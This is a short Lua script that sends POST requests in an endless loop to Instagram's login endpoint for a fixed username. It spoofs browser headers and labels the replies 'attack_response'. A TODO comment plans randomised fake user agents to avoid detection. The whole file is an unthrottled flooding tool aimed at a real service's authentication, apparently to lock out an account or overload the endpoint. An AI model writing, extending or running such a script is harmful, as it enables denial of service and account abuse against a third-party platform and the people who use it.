local http = require("socket.http")
local ltn = require("ltn12")

local request_payload = [[queryParams={}&optIntoOneTap=false&username=sudopacmandeleteme]]
local request_headers = {
	-- TODO add fake_agent() functin to generate random fake_agent
     ["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
     ["X-Requested-With"] = "XMLHttpRequest",
     ["Referer"] = "http://www.instagram.com/accounts/login"
}
while true do
	local attack_response = {}
	local body, code, headers = http.request {
		url = "https://instagram.com/accounts/login/ajax/",
		method = "POST",
		headers = request_headers,
		source = ltn.source.string(request_payload),
		sink = ltn.sink.table(attack_response)
	}
	print(code)
end
